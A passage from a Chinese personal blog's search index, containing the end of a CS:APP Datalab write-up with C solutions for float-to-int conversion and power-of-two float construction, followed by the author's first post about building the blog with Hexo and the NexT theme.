class="built_in">exp</span>&lt;&lt;<span class="number">23</span>) + frac;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="floatFloat2Int"><a href="#floatFloat2Int" class="headerlink" title="floatFloat2Int"></a>floatFloat2Int</h3><p>题意：给你一个无符号数，并将其看成浮点数(32位)，要求输出(int)x的值<br>思路：本题依然在考察对浮点数的基本理解。解决的思路同上题类似，不再赘述。另外提醒一下，本题有个坑，求得到的bias直接拿来进行右移运算或左移运算会存在问题：&gt;&gt; 和 &lt;&lt; 运算符当偏移量超过32时，会自动进行取模运算，故有可能使得结果出现错误。左移的话有可能还会导致答案溢出。记得分类讨论。<br>解：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">floatFloat2Int</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> frac = uf &amp; <span class="number">0x007fffff</span>;</span><br><span class="line">uf &gt;&gt;= <span class="number">23</span>;</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">exp</span> = uf &amp; <span class="number">0xff</span>;</span><br><span class="line">uf &gt;&gt;= <span class="number">8</span>;</span><br><span class="line"><span class="keyword">int</span> sgn = uf;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0xff</span>) <span class="keyword">return</span> <span class="number">0x80000000</span>u;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">exp</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">frac |= <span class="number">0x800000</span>;</span><br><span class="line"><span class="keyword">int</span> bias = <span class="built_in">exp</span> - <span class="number">0x7f</span> - <span class="number">23</span>;</span><br><span class="line"><span class="keyword">if</span> (bias &lt; <span class="number">0</span>) &#123;</span><br><span class="line">bias = -bias;</span><br><span class="line"><span class="keyword">if</span> (bias &gt;= <span class="number">32</span>) bias = <span class="number">31</span>;</span><br><span class="line">frac &gt;&gt;= bias;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (bias &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">while</span>(bias) &#123;</span><br><span class="line">frac&lt;&lt;=<span class="number">1</span>;</span><br><span class="line">bias--;</span><br><span class="line"><span class="keyword">if</span> (frac &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0x80000000</span>u;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (sgn) <span class="keyword">return</span> -frac;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> frac;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="floatPower2"><a href="#floatPower2" class="headerlink" title="floatPower2"></a>floatPower2</h3><p>题意：给一个整数x，要求输出2.0<sup>x</sup>的值。<br>思路：同样，本题依然在考察对浮点数存储的基本理解。要注意的是，+INF的是指exp为0xff，frac为0的值。NaN指的是exp为0xff，frac不为0的值。0的浮点数表示依然为0。<br>解：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatPower2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sgn = <span class="number">0</span>, <span class="built_in">exp</span> = <span class="number">0</span>, frac = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (x &lt; <span class="number">-126</span> - <span class="number">23</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (x &lt; <span class="number">-126</span>) frac = <span class="number">1</span> &lt;&lt; (<span class="number">149</span>+x);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">exp</span> = x + <span class="number">127</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> &gt; <span class="number">0xff</span>) <span class="keyword">return</span> <span class="number">0x7f800000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">exp</span>&lt;&lt;<span class="number">23</span>) + frac;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>　　倘若一切顺利，你最终将得到类似这样的一张图片：<br>　　<img src="/2018/12/25/csapp-Datalab/firstLab.png" alt="Datalab_final"><br>　　那么恭喜你，你的第一个实验————Datalab通关啦！</p>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csapp </tag>
            
            <tag> binary </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>First article</title>
      <link href="/2018/12/14/First-article/"/>
      <url>/2018/12/14/First-article/</url>
      
        <content type="html"><![CDATA[<h1 id="First-article"><a href="#First-article" class="headerlink" title="First article"></a>First article</h1><blockquote><p>终于基本把博客弄完了</p></blockquote><p>　　感觉现在充满了成就感O(∩_∩)O。从这星期一开始就想弄了，但是却一直拖着。前两天在学HTML的一些语法，觉得语法真的好多啊，而且有点复杂。然后周三周四就基本都是在看搭博客的一些相关的东西，花了好长时间，一直在踩坑（可能是我比较菜）。买域名，弄github pages什么的。一开始用jekyll的框架来搭建，遇到了无数的问题，最后好在基本解决了，但是又发现踏入了一个新的大坑：找不到好用的模板。然后最后看到了hexo，果断先找模板。在看到了nexT这个主题之后，果断选择入坑。</p><p>　　可能是由于之前jekyll踩的坑有点多，也有可能是hexo比较适合小白。。基本上这个搭建过程中没有出现什么比较大的问题，然后弄完就是各种优化什么的，也算比较顺利吧，到今天早上就基本算是结束了。整体上还是过得去的。（不过貌似手机版看起来的效果比较差？？）</p><p>　　然后在这里就还是来立一个flag吧。以后（至少应该是大学期间吧）这个博客应该是会一直做下去的，尽量每个月至少发一篇博客吧，不过比较忙的时候的话可能没什么办法。基本上大部分博客的内容应该是以硬核为主，不过目前水平不够，也没办法写出比较高质量的东西。内容上可能主要是当前阶段在学习的一些东西，算法，数据结构，或者是自己做的一些小项目，课设什么的也有可能会放进来。目的还是分享吧，如果有什么地方写的不太好，欢迎直接私戳（网页版的话右下角应该是有一个对话框的）。</p><p>　　好吧，憋不出来了。。就这样吧</p><p>　　哦对了，最后放上一张有爱的图片镇楼（<a href="https://www.pixiv.net/" target="_blank" rel="noopener">p站</a>上找的）。<br><img src="/2018/12/14/First-article/ピカチュウ.jpg" alt="ピカチュウ"></p>]]></content>
      
      
      <categories>
          
          <category> others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> others </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
